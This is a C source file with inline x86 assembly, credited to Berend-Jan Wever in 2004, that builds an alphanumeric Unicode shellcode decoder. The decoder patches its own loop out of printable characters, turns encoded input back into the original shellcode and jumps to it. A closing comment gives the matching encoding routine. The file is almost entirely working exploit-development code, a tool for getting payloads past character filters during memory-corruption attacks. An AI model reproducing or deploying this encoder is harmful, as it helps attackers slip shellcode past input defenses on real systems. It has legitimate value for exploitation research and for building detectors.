/*
  Alphanumeric (mixed-case) unicode alphanumeric decoder.
  (C) Copyright 2004 Berend-Jan Wever
  
  Pre-execution requirements:
    %ecx = baseaddress of code.
  Short description:
    The code will "add-patch" it's own last bytes into a decoder loop, this
    decoder loop will then convert the string behind it from alphanumeric
    unicode characters back to the origional shellcode untill it reaches a 'Z'.
    Execution is then transfered to the decoded shellcode, passing that
    shellcode's baseaddress on in ebp.
  Encoding scheme for origional shellcode:
    Every byte 0xAB is encoded in two unicode words:  (CD 00) and (EF 00)
    Where F = B and E is arbitrary (3-7) as long as EF is alphanumeric,
    D = A-E and C is arbitrary (3-7) as long as CD is alphanumeric.
*/

// allignment null -> byte
#define AL ".byte 0, 0x41, 0\n" //add %al, (%ecx)
#define AH ".byte 0, 0x61, 0\n" //add %ah, (%ecx)
#define BL ".byte 0, 0x59, 0\n" //add %bl, (%ecx)
#define BH ".byte 0, 0x79, 0\n" //add %bh, (%ecx)
#define CL ".byte 0, 0x49, 0\n" //add %cl, (%ecx)
#define CH ".byte 0, 0x69, 0\n" //add %ch, (%ecx)
#define DL ".byte 0, 0x51, 0\n" //add %dl, (%ecx)
#define DH ".byte 0, 0x71, 0\n" //add %dl, (%ecx)

int main(void) {
  __asm__(
    // output the code to stdout
    "    mov     $end-start, %edx       \n" // length
    "    mov     $start, %ecx           \n" // source
    "    mov     $0x1, %ebx             \n" // stdout
    "    mov     $0x4, %eax             \n" // write
    "    int     $0x80                  \n"
    "    jmp     end                    \n"
    "start:                             \n"

    "    xor     $0, %al                \n"
    "    xor     $0, %al                \n"
    "    xor     $0, %al                \n"
    "    xor     $0, %al                \n"
    "    xor     $0, %al                \n"
    // Now we have to get a register to point to our decoder loop, so we can
    // start patching. Assuming %ecx points to the baseaddress of this code,
    // the decoder loop will be around %ecx+0x100. Since our limited instruction
    // set does not include a direct way to add a value to a register, we have
    // to do this in another way:
    "    push    $0x0                   \n" // 00 00 00 00
    "    push    %ecx                   \n" // D1 C1 B1 A1 00 00 00 00
CH  "    push    $0x41007700            \n" // 00 77 00 41 D1 C1 B1 A1 00 00 00 00
AH  "    inc     %esp                   \n" // 77 00 41 D1 C1 B1 A1 00 00 00 00
DL  "    pop     %eax                   \n" // 0xD1410077, ah = 0
BL  "    pop     %edx                   \n" // 0x00A1B1C1
    // We can safely assume 0X00A1B1C1 +1 will not carry to the MSB, because
    // then our shellcode would have to wrap around 0xFFFFFFFF to 0x00000000.
CL  "    inc     %edx                   \n" // 0X00A2B2C2 = 0X00A1B1C1 +1
AL  "    push    %edx                   \n" // C2 B2 A2 00 00 00 00
DH  "    push    %eax                   \n" // 77 00 41 D1 C2 B2 A2 00 00 00 00
BH  "    dec     %esp                   \n" // XX 77 00 41 D1 C2 B2 A2 00 00 00 00
DL  "    pop     %edx                   \n" // dh = 77
CL  "    pop     %ecx                   \n" // 0xA2B2C2D1 = 0xA1B1C1D1+0x100
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
AH  "    dec     %ecx                   \n"
    // Setup for popa                          eax = 0x0 (still left on stack)
AH  "    push    %esp                   \n" // ecx = esp (after popa) - 4
AH  "    push    $0x41005A00            \n" // dh = terminator 'Z'
AH  "    push    $0                     \n" // ebx = 0x0
    "    push    $0                     \n" // esp (ignored)
    "    push    %ecx                   \n" // ebp = data
AH  "    push    %ecx                   \n" // edi = data
AH  "    push    %ecx                   \n" // edi = data
    // Patch "loop" address (EE) from 0
AH  "    dec     %ecx                   \n"
    "    add     %dh, 0(%ecx)           \n" // 77
    "    push    $0x41005500            \n"
    "    add     %dh, 0(%ecx)           \n" // EE
    "    pop     %edx                   \n" // dh = 55, dl = 0
    // Patch cmp (36) from 0
DL  "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
DL  "    xor     $0x41003600, %eax      \n" // ah = 36
    "    add     %ah, 0(%ecx)           \n" // 36
    // Patch stosb (aa) from 0
    "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
    "    add     %dh, 0(%ecx)           \n" // 55
    "    xor     $0x41004200, %eax      \n" // ah = 74
    "    add     %dh, 0(%ecx)           \n" // AA
    // Patch ror (e8) from 0
    "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
    "    add     %ah, 0(%ecx)           \n" // 74
    "    dec     %ebx                   \n"
    "    add     %ah, 0(%ecx)           \n" // E8
    // Patch ror (c1) from 4d
    "    dec     %ecx                   \n"
    "    add     %ah, 0(%ecx)           \n" // C1
    // Patch lodsd (ad) from 39
    "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
DL  "    dec     %ecx                   \n"
    "    add     %ah, 0(%ecx)           \n" // AD
    // Setup edx, esi and edi
    "    popa                           \n"
    // This is the part we are patching to create the unicode decoder loop:
    // assume ecx = esp-4, esi = edi = data baseaddress, dh = terminator character.
                                  // loop:
BH  " .byte 0x6A, 0x00        \n" //    push    $0x0           6A 00    |
    " .byte 0x39              \n" //    lodsd                  ad       | ab 00 cd 00 -> 0x00cd00ab    !
    " .byte 0x00, 0x41, 0x00  \n" //    add   %al, 0(%ecx)     00 41 00 | 0xab
    " .byte 0x4d, 0x00, 0x4C  \n" //    ror   $0x4C, %eax      c1 e8 4C | 0x0ab00cd0                   !!
    " .byte 0x00, 0x41, 0x00  \n" //    add   %al, 0(%ecx)     00 41 00 | 0xab+0xd0 (ff)
    " .byte 0x58              \n" //    pop   %eax             58       | 0x000000ff
    " .byte 0x00              \n" //    stosb                  aa       | 0xff                         !
    " .byte 0x38, 0x00        \n" //    cmp   %dh, (%esi)      38 36    |                              !
    " .byte 0x75, 0x00        \n" //    jne   loop             75 ee    |
    "end:                               \n"
  );
 exit(0);
}

/*
  // Random seed  
  struct timeval tv;
  struct timezone tz;
  gettimeofday(&tv, &tz);
  srand((int)tv.tv_sec*tv.tv_usec);

// encoding
// 0xAB -> CD 00 EF 00
// F = B
// E is arbitrary (3-7) as long as EF is alphanumeric
// D = A-E
// C is arbitrary (3-7) as long as CD is alphanumeric
    A = (input & 0xf0) >> 4;
    B = (input & 0x0f);
    F = B;
    E = (F<=0x9 ? 3+(rand()%5) : // 30-39, 40-49, 50-59, 60-69, 70-79
          (F<=0xA) ? 4+(rand()%4) : // 4A, 5A, 6A, 7A
            4+2*(rand()%2  // 4B-4F, 6B-6F
          )
        );
    D = A-E & 0x0f;
    C = (D<=0x9 ? 3+(rand()%5) : // 30-39, 40-49, 50-59, 60-69, 70-79
          (D<=0xA) ? 4+(rand()%4) : // 4A, 5A, 6A, 7A
            4+2*(rand()%2  // 4B-4F, 6B-6F
          )
        );
    
*/    